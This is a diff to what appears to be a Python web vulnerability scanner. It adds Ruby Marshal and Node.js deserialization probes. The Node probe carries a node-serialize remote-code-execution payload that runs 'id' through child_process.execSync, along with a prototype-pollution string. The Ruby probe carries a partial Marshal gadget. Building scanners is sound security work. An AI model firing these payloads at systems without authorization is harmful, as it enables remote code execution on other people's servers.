@@ -58,6 +58,8 @@ class DeserializationModule:
         self._test_php_deser(url, method, param, value)
         self._test_python_pickle(url, method, param, value)
         self._test_dotnet_viewstate(url, method, param, value)
+        self._test_ruby_deser(url, method, param, value)
+        self._test_node_deser(url, method, param, value)
     
     def test_url(self, url):
         """Test URL for deserialization indicators"""
@@ -170,6 +172,63 @@ class DeserializationModule:
                             url=url, severity='HIGH', confidence=0.75,
                             param=param, payload=payload[:50],
                             evidence=f".NET deserialization indicator: {indicator}",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
+    
+    def _test_ruby_deser(self, url, method, param, value):
+        """Test for Ruby deserialization vulnerabilities"""
+        ruby_payloads = [
+            '\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements',
+            'BAhpBg==',  # Marshal.dump(1) base64
+        ]
+        ruby_indicators = ['marshal', 'typeerror', 'argumenterror', 'gem::', 'ruby', 'nomethoderror']
+        for payload in ruby_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                response_text = response.text.lower()
+                for indicator in ruby_indicators:
+                    if indicator in response_text:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="Deserialization (Ruby Marshal)",
+                            url=url, severity='HIGH', confidence=0.8,
+                            param=param, payload=payload[:50],
+                            evidence=f"Ruby deserialization indicator: {indicator}",
+                        )
+                        self.engine.add_finding(finding)
+                        return
+            except Exception:
+                continue
+    
+    def _test_node_deser(self, url, method, param, value):
+        """Test for Node.js deserialization vulnerabilities"""
+        node_payloads = [
+            '{"rce":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\')}()"}',
+            '{"__proto__":{"polluted":true}}',
+            '_$$ND_FUNC$$_function(){return 1}()',
+        ]
+        node_indicators = ['node-serialize', 'unserialize', 'child_process', 'rce', '_$$nd_func$$_', 'syntaxerror', 'referenceerror']
+        for payload in node_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                response_text = response.text.lower()
+                for indicator in node_indicators:
+                    if indicator in response_text:
+                        from core.engine import Finding
+                        finding = Finding(
+                            technique="Deserialization (Node.js)",
+                            url=url, severity='CRITICAL', confidence=0.85,
+                            param=param, payload=payload[:50],
+                            evidence=f"Node.js deserialization indicator: {indicator}",
                         )
                         self.engine.add_finding(finding)
                         return
